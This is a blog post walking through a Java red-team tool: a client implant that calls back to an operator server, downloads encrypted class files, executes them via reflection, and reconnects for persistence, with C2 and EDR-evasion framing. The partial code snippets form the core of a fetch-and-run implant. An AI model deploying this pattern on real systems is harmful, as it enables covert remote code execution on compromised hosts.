---
title: Building a Remote Class Loader in Java
author: vrls
date: 2022-08-25
tags: [java, remote, class, loader, classloader, c2, c&c, antivirus, edr, evasion, socket, network, encryption, chacha20, persistence, programming, development, reflection, api, pentest, tool, tooling, red team]
image: /assets/img/posts/2022/08/cb350880cb958301f950327f10128471059a1fe3.png
permalink: /posts/2022/08/building-a-remote-class-loader-in-java/

---

<!-- ![image](/assets/img/posts/2022/08/cb350880cb958301f950327f10128471059a1fe3.png) -->

## Introduction


Inspired by some tools ([rebeyond Behinder](https://github.com/rebeyond/Behinder), [AntSword](https://github.com/AntSwordProject/antSword)) and CTF challenges, I decided to make a project that facilitates the loading of Java classes into remote computers (or targets).

During a pentest process we typically abuse shells and commands that are limited to the context we are working on. I thought it would be nice to have a simple-*ish* way to run our code into target computers while having the freedom to use any libraries we would like to and without needing a lot of privileges, installation and configuration of additional software. 

Technically we could download a C compiler to build our executables on the compromised machine or even use Python interpreters, but Java seemed the right choice to make this project as it allows to create structured, modular programs and extend it by adding new features without hassle. Plus having the opportuniy to design a nice GUI.

The main idea is quite simple: having a client-server architechure, where clients connect to server and grab Java bytecode (class file) to load and invoke methods.

At the moment of writing this post, the tool allows, not only the delivery of Java bytecode, but also encryption of payload just before its transmission on the network, and a "keepalive" function for additional persistence that re-connects in case of connection failure.

**DISCLAIMER:** I am not responsible for any damage this tool could cause, even though it is poorly coded as I'm not a software engineer. Expect bad code and several bugs.



## Settings

Settings are defined by arguments. Server and client share some options, such as bind address/connect address and bind port/connect port, respectively. 

Arguments are parsed using `org.apache.commons.cli.CommandLine` lib. The defaults are currently hardcoded.


![image](/assets/img/posts/2022/08/05917b295ec8f5ab4c5c4509a6cf65bcb0c17b19.png)


## Client & Server

Both client and server are included in same program. After building the project and respective artifacts (JAR package) we may select to run as client or server by passing the arguments `-client` or `-server`. Both are singletons and have their own classes.


```java
// Load settings from specified args
Settings.loadSettings(cmd);

// Run as client OR server
if (cmd.hasOption("client")) {
    System.out.println("Running as client");
    Client.getInstance().run();

} else if (cmd.hasOption("server")) {
    System.out.println("Running as server");
    Server.getInstance().run();

} else {
    System.out.println("You must select to either run as -client or -server");
}
```


### Client

Client is single threaded and will begin by connecting to server and retry if connection was unsucessful. Once the connection has established, the client will receive the bytecode sent by the server, decrypt it, and load using ClassLoader.

If `-keepalive` is used, the client will loop to request Java class from server. If the current communication is interrupted (e.g. server restart), it will attempt to establish a new connection.



```java
do {
    // Connect to server (retry if fails)
    connect(settings.getAddress(), settings.getPort());
    [...]
    // Allocate space to store data received from server
    byte[] buffer = new byte[4096];
    ByteArrayOutputStream byteArrayStream = new ByteArrayOutputStream();

    // Receive classfile from server
    [...]
    byteArrayStream.write(buffer, 0, in.read(buffer));
    System.out.println(String.format("Received %d bytes from server", 
            byteArrayStream.size()));

    // Load the received class
    LoadClass loader = new LoadClass(settings.getClassName(),
            settings.getClassMethod(),
            cipher.decrypt(byteArrayStream.toByteArray()));

    // Execute the payload and store the text output
    String output = loader.load();
    [...]
    Thread.sleep(REFRESH);
} while (settings.getKeepalive());
```


### Server

On the other side, server spawns a new thread for each client connecting to it. Once the connection is established, the server will deliver encrypted Java bytecode to the client. 

The payload should be first compiled into a class file and its local path must be specified as an argument when starting the server. The `javac` version used to compile the payload should not be higher than the client JRE version (at this moment I am using **OpenJDK build 11.0.15.1+2-LTS**).

```java
 // Handle incoming connections and spawn new thread for each client
while (true) {
    try {
        clientHandler = new ClientHandler(serverSocket.accept());
    } catch (IOException e) {
        throw new RuntimeException(e);
    }

    thread = new Thread(clientHandler);
    thread.start();
}
```


```java
while (clientSocket.isConnected() && !clientSocket.isClosed()) {
    [...]
    // Send classfile to client
    byte[] classBytes = Utils.file2ByteArray(Settings.getInstance().getClassFile());
    out.write(cipher.encrypt(classBytes));
    out.flush();
    System.out.println(String.format("Sent %d bytes to client", classBytes.length));

    // Receive execution output from client
    byte[] buffer = new byte[4096];
    ByteArrayOutputStream byteArrayStream = new ByteArrayOutputStream();
    
    [...]
    byteArrayStream.write(buffer, 0, in.read(buffer));

    System.out.println(String.format("Received %d bytes from client: %s", byteArrayStream.size(),
            new String(cipher.decrypt(byteArrayStream.toByteArray()))));
}
```




## Encryption

Data in-transit is encrypted using ChaCha20 ([JEP-329](https://openjdk.org/jeps/329)). It randomly generates a 256-bit key or uses a specified key via argument, in base64 encoded format. Current ChaCha configuration lacks good practices and is likely *insecure* due to reusing a fixed nonce everytime. Either way it works for testing and proof-of-concept purposes.



```java
public static SecretKey getKey()  {
    KeyGenerator keyGen = KeyGenerator.getInstance("ChaCha20");
    keyGen.init(256, SecureRandom.getInstanceStrong());
    SecretKey generatedKey = keyGen.generateKey();
    System.out.println("Generated new key: " +
            Base64.getEncoder().encodeToString(generatedKey.getEncoded()));
    [...]
    return generatedKey;
}


public byte[] encrypt(byte[] plainText)  {
    Cipher cipher = Cipher.getInstance(CIPHER);
    ChaCha20ParameterSpec param = new ChaCha20ParameterSpec(nonce, counter);
    cipher.init(Cipher.ENCRYPT_MODE, key, param);
    byte[] encryptedText = cipher.doFinal(plainText);
    [...]
    return encryptedText;
}
```


## Class Loading

Finally, when the client receives the payload in bytecode format from the server, it invokes the desired method using [Java Reflection API](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/lang/reflect/Method.html).

At this time the class loader expects a class with a static method that takes no arguments and returns `String` that could be used to return execution output to the operator. It should be replaced with a better alternative to handle different kinds of outputs.


```java
public String load()  {
    String output = "";
    Class newClass = defineClass(className, data, 0, data.length);
    Method method = null;

    try {
        method = newClass.getMethod(methodName, null);
        Object o = method.invoke(null, null);
        output = (String) o;
    } catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) {
        System.err.println("Error invoking class method");
        throw new RuntimeException(e);
    }
    
    return output;
}
```



## Usage Demo


<!--
<video width="100%" controls>
  <source src="/assets/img/posts/2022/08/f44fd83bac8c92485dbabd8c1f654d173a953589.mp4" type="video/mp4" />
</video>

-->


Soundtrack by [The Algorithm](https://thealgorithm.bandcamp.com/).

## To Do (maybe)

* Multiplex clients/payloads
* Database to maintain clients summary (e.g. UUIDs, hostname, username, OS)
* Simple CLI for server (just like any basic C2) to manage the connected clients
* Load settings via file (yaml, toml, json, whatever)
* Handling of variable payload arguments and return type
* GUI
    * No, it doesn't need to be a Cobalt Strike


## Source Code

Available on my Github repo:

* [https://github.com/joaovarelas/java-remote-class-loader](https://github.com/joaovarelas/java-remote-class-loader)


## References

1.  [https://github.com/rebeyond/Behinder](https://github.com/rebeyond/Behinder)

2. [https://github.com/AntSwordProject/antSword](https://github.com/AntSwordProject/antSword)

3. [https://cyberandramen.net/2022/02/18/a-tale-of-two-shells/](https://cyberandramen.net/2022/02/18/a-tale-of-two-shells/)

4. [https://www.sangfor.com/blog/cybersecurity/behinder-v30-analysis](https://www.sangfor.com/blog/cybersecurity/behinder-v30-analysis)

11. [https://xz.aliyun.com/t/2799](https://xz.aliyun.com/t/2799)

12. [https://medium.com/@m01e/jsp-webshell-cookbook-part-1-6836844ceee7](https://medium.com/@m01e/jsp-webshell-cookbook-part-1-6836844ceee7)

10. [https://venishjoe.net/post/dynamically-load-compiled-java-class/](https://venishjoe.net/post/dynamically-load-compiled-java-class/)

5. [https://users.cs.jmu.edu/bernstdh/web/common/lectures/slides_class-loaders_remote.php](https://users.cs.jmu.edu/bernstdh/web/common/lectures/slides_class-loaders_remote.php)

6. [https://www.javainterviewpoint.com/chacha20-poly1305-encryption-and-decryption/](https://www.javainterviewpoint.com/chacha20-poly1305-encryption-and-decryption/)

7. [https://openjdk.org/jeps/329](https://openjdk.org/jeps/329)

8. [https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/lang/ClassLoader.html](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/lang/ClassLoader.html)

9. [https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/lang/reflect/Method.html](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/lang/reflect/Method.html)

